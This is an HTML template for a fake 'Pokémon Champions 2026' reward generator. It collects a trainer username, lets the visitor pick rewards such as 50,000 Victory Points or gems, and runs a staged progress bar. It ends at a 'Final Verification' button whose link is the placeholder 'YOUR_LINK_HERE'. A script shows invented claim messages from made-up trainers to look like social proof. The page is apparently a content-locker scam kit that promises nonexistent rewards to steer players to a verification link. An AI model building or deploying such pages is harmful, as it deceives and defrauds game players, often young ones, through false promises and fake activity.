<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pokémon Champions 2026 - Global Sync</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;500;800&display=swap');

        :root {
            --primary: #00f2ff;
            --accent: #ff007a;
            --gold: #ffcc00;
            --glass-bg: rgba(10, 15, 30, 0.95);
        }

        body {
            background: #02050a;
            color: #fff;
            font-family: 'Inter', sans-serif;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
            background: linear-gradient(rgba(2, 5, 10, 0.9), rgba(2, 5, 10, 0.9)), 
                        url('https://images.unsplash.com/photo-1614850523296-d8c1af93d400?q=80&w=2070&auto=format&fit=crop'); /* Professional Abstract BG */
            background-size: cover;
            background-attachment: fixed;
            background-position: center;
        }

        nav {
            background: rgba(0,0,0,0.85);
            padding: 15px 5%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--primary);
            backdrop-filter: blur(10px);
        }

        .logo-nav { width: 120px; filter: drop-shadow(0 0 5px var(--primary)); }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 50px 20px;
        }

        .main-card {
            background: var(--glass-bg);
            backdrop-filter: blur(30px);
            border: 1px solid rgba(0, 242, 255, 0.2);
            border-radius: 30px;
            width: 100%;
            max-width: 500px;
            padding: 40px;
            box-shadow: 0 25px 60px rgba(0,0,0,0.9), 0 0 30px rgba(0, 242, 255, 0.2);
            text-align: center;
            box-sizing: border-box;
            position: relative;
        }

        .badge-live {
            background: linear-gradient(45deg, var(--primary), var(--accent));
            font-size: 0.6rem;
            padding: 5px 12px;
            border-radius: 50px;
            font-weight: 900;
            position: absolute;
            top: 20px;
            right: 20px;
            text-transform: uppercase;
        }

        h2, h3 { font-family: 'Orbitron', sans-serif; text-transform: uppercase; letter-spacing: 1px; }

        .input-ui {
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid var(--primary);
            border-radius: 12px;
            padding: 18px;
            width: 100%;
            color: #fff;
            font-size: 1rem;
            margin-bottom: 15px;
            box-sizing: border-box;
            outline: none;
        }

        .grid-rewards {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin: 25px 0;
        }

        .reward-card {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 20px 10px;
            cursor: pointer;
            transition: 0.3s;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .reward-card.active {
            border-color: var(--primary);
            background: rgba(0, 242, 255, 0.1);
            transform: translateY(-5px);
        }

        /* Iṣlaḥ l-images - Direct SVG icons */
        .reward-card img { 
            width: 70px; 
            height: 70px;
            object-fit: contain;
            margin-bottom: 12px; 
        }

        .btn-action {
            background: linear-gradient(to right, var(--primary), #00a2ff);
            color: #000;
            width: 100%;
            padding: 22px;
            border: none;
            border-radius: 15px;
            font-weight: 900;
            font-size: 1.2rem;
            cursor: pointer;
            text-transform: uppercase;
            font-family: 'Orbitron', sans-serif;
        }

        .hidden { display: none; }

        .loader {
            width: 50px; height: 50px; border: 4px solid #111; border-top: 4px solid var(--primary);
            border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }

        .activity-feed {
            margin-top: 30px;
            padding: 12px;
            background: rgba(0,0,0,0.6);
            border-radius: 50px;
            font-size: 0.75rem;
            color: #00f2ff;
            border: 1px solid rgba(0,242,255,0.1);
        }
    </style>
</head>
<body>

<nav>
    <img src="https://upload.wikimedia.org/wikipedia/commons/9/98/International_Pok%C3%A9mon_logo.svg" class="logo-nav">
    <div style="font-size: 0.7rem; text-align: right;">
        <span style="color: #2ecc71;">● SYNC ACTIVE</span>
    </div>
</nav>

<div class="container">
    <div class="main-card">
        <div class="badge-live">v4.2 SECURED</div>
        
        <div id="ui-step1">
            <h2 style="margin-top: 40px; color: var(--primary);">Global Distribution</h2>
            <input type="text" class="input-ui" id="trainer-name" placeholder="Trainer Username...">
            <button class="btn-action" onclick="toStep2()">Secure Connection</button>
        </div>

        <div id="ui-step2" class="hidden">
            <h3 style="margin-bottom: 20px; font-size: 0.9rem;">2. SELECT ASSETS</h3>
            <div class="grid-rewards">
                <div class="reward-card active" onclick="selectReward(this, '50,000 VP')">
                    <img src="https://www.svgrepo.com/show/271164/pokeball-pokemon.svg">
                    <span style="display:block; font-weight:900;">50,000</span>
                    <small style="color:var(--primary); font-size:0.7rem;">Victory Points</small>
                </div>
                <div class="reward-card" onclick="selectReward(this, '10,000 Gems')">
                    <img src="https://www.svgrepo.com/show/422280/diamond-gem-jewel.svg">
                    <span style="display:block; font-weight:900;">10,000</span>
                    <small style="color:var(--primary); font-size:0.7rem;">Champion Gems</small>
                </div>
                <div class="reward-card" onclick="selectReward(this, 'Elite Pass')">
                    <img src="https://www.svgrepo.com/show/305545/ticket.svg" style="filter: invert(48%) sepia(79%) saturate(2476%) hue-rotate(162deg) brightness(118%) contrast(119%);">
                    <span style="display:block; font-weight:900;">S12</span>
                    <small style="color:var(--primary); font-size:0.7rem;">Elite Battle Pass</small>
                </div>
                <div class="reward-card" onclick="selectReward(this, 'Omni Stone')">
                    <img src="https://www.svgrepo.com/show/440552/evolution-stone.svg">
                    <span style="display:block; font-weight:900;">OMNI</span>
                    <small style="color:var(--primary); font-size:0.7rem;">Evolution Stone</small>
                </div>
            </div>
            <button class="btn-action" onclick="toStep3()">Initiate Generator</button>
        </div>

        <div id="ui-sync" class="hidden" style="padding: 40px 0;">
            <div class="loader"></div>
            <h4 id="status-text" style="color: var(--primary); font-family: 'Orbitron';">Handshaking...</h4>
            <div style="width: 100%; background: #111; height: 8px; border-radius: 10px; overflow: hidden; margin-top: 20px;">
                <div id="progress-bar" style="width: 0%; height: 100%; background: var(--primary); transition: 0.3s;"></div>
            </div>
        </div>

        <div id="ui-locker" class="hidden">
            <h3 style="color: var(--accent);">Final Verification</h3>
            <p style="font-size: 0.85rem; color: #ccc;">Syncing: <span id="summary-res" style="color: var(--primary); font-weight:bold;">...</span></p>
            <div style="background: rgba(0, 242, 255, 0.05); padding: 25px; border: 2px dashed var(--primary); border-radius: 20px; margin: 20px 0;">
                <button class="btn-action" onclick="window.location.href='YOUR_LINK_HERE'">Verify Now</button>
            </div>
        </div>

        <div class="activity-feed">
            <i class="fas fa-bolt"></i> <span id="live-text">Waiting for trainer...</span>
        </div>
    </div>
</div>

<script>
    let selectedItem = "50,000 VP";

    function toStep2() {
        if(document.getElementById('trainer-name').value.length < 3) return alert('Enter Trainer Name');
        document.getElementById('ui-step1').classList.add('hidden');
        document.getElementById('ui-step2').classList.remove('hidden');
    }

    function selectReward(el, name) {
        document.querySelectorAll('.reward-card').forEach(r => r.classList.remove('active'));
        el.classList.add('active');
        selectedItem = name;
    }

    function toStep3() {
        document.getElementById('ui-step2').classList.add('hidden');
        document.getElementById('ui-sync').classList.remove('hidden');
        document.getElementById('summary-res').innerText = selectedItem;
        let progress = 0;
        const interval = setInterval(() => {
            progress += 5;
            document.getElementById('progress-bar').style.width = progress + '%';
            if(progress >= 100) {
                clearInterval(interval);
                setTimeout(() => {
                    document.getElementById('ui-sync').classList.add('hidden');
                    document.getElementById('ui-locker').classList.remove('hidden');
                }, 500);
            }
        }, 100);
    }

    setInterval(() => {
        const trainers = ['X_Slayer', 'PokeGod', 'Sara_PKM', 'Mega_Ash'];
        const t = trainers[Math.floor(Math.random()*trainers.length)];
        document.getElementById('live-text').innerText = `Trainer \`${t}\` successfully claimed reward!`;
    }, 4000);
</script>

</body>
</html>
